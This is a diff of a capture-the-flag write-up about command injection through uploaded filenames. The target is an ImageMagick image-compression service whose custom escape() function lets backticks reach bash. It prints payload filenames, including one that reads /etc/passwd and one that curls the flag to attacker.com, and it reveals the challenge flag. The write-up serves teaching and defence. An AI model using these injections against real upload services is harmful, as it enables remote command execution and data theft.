@@ -116,6 +116,7 @@ We're given a web application that compresses images using ImageMagick. The sour
 
 ### Application Overview
 The application is a simple image compression service built with:
+
 - **Bun** runtime
 - **Elysia** web framework  
 - **ImageMagick** for image processing
@@ -210,25 +211,19 @@ The `escape()` function attempts to sanitize filenames by adding a backslash bef
 When a filename contains backticks with an odd number of preceding backslashes, command substitution occurs:
 
 1. Filename: 
-
-```
-\`command\`.jpg
-```
-
+  ```
+  \`command\`.jpg
+  ```
 2. After `escape()`: 
-
-```
-\\`command\\`.jpg
-```
-
+  ```
+  \\`command\\`.jpg
+  ```
 3. In bash command: 
-
-```
-magick "./tmp/inputs/\\`command\\`.jpg" ...
-```
-
+  ```
+  magick "./tmp/inputs/\\`command\\`.jpg" ...
+  ```
 4. Bash parsing inside `"..."`:
-   - `\\` → `\` (single backslash)
+    - `\\` → `\` (single backslash)
 5. Result: `` `command` `` - command substitution executes!
 
 ## Exploit Development
@@ -267,13 +262,12 @@ magick: unable to open image './tmp/inputs/\.jpg': No such file or directory @ e
 ## Full Exploit Chain
 
 ### Step-by-Step Execution
-1. **User uploads** image with filename `\`echo $FLAG\`.jpg`
-2. **Server escapes** filename to `\\\`echo $FLAG\\\`.jpg`
-3. **Command constructed**: `magick "./tmp/inputs/\\\`echo $FLAG\\\`.jpg" -quality 85 -strip "./tmp/outputs/\\\`echo $FLAG\\\`.jpg"`
+1. **User uploads** image with filename ```\`echo $FLAG\`.jpg```
+2. **Server escapes** filename to ```\\`echo $FLAG\\`.jpg```
+3. **Command constructed**: ```magick "./tmp/inputs/\\`echo $FLAG\\`.jpg" -quality 85 -strip "./tmp/outputs/\\`echo $FLAG\\`.jpg"```
 4. **Bash parses** inside double quotes:
-   - `\\` → `\`
-   - `\`` → `` ` ``
-   - Result: `` `echo $FLAG` ``
+    - `\\` → `\`
+    - Result: ``` `echo $FLAG` ```
 5. **Command substitution** executes `echo $FLAG`
 6. **Output** `TSGCTF{...}` replaces the backtick expression
 7. **Final command**: `magick "./tmp/inputs/\.jpg" ...` (`.` from command output)
@@ -282,13 +276,15 @@ magick: unable to open image './tmp/inputs/\.jpg': No such file or directory @ e
 
 ### Alternative Payloads
 The vulnerability allows arbitrary command execution:
-- `` \`id\`.jpg `` - Execute `id` command
-- `` \`cat /etc/passwd\`.jpg `` - Read system files
-- `` \`bash -c "curl http://attacker.com/?flag=$(echo $FLAG)"\`.jpg `` - Exfiltrate data
+
+- ``` \`id\`.jpg ``` - Execute `id` command
+- ``` \`cat /etc/passwd\`.jpg ``` - Read system files
+- ``` \`bash -c "curl http://attacker.com/?flag=$(echo $FLAG)"\`.jpg ``` - Exfiltrate data
 
 ## Root Cause Analysis
 
 ### Multiple Failure Points
+
 1. **Custom escape function**: Rolling your own security functions is error-prone
 2. **Shell command construction**: User input directly in shell commands
 3. **Bash parsing complexity**: Misunderstanding of how bash interprets escaped characters in quotes
@@ -334,6 +330,7 @@ const inputPath = `./tmp/inputs/${randomName}`;
 
 ## Flag Explanation
 The flag `TSGCTF{d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt_and_r3ad0nly_15_r3qu1r3d_f0r_c0mmand_1nj3c710n_chall3ng35}` hints at:
+
 - `d0llar_s1gn_1s_mag1c_1n_sh3ll_env1r0nm3nt` - Environment variables with `$` expansion
 - `r3ad0nly_15_r3qu1r3d` - The filesystem is read-only (as seen in compose.yaml)
 - `f0r_c0mmand_1nj3c710n_chall3ng35` - Classic command injection challenge
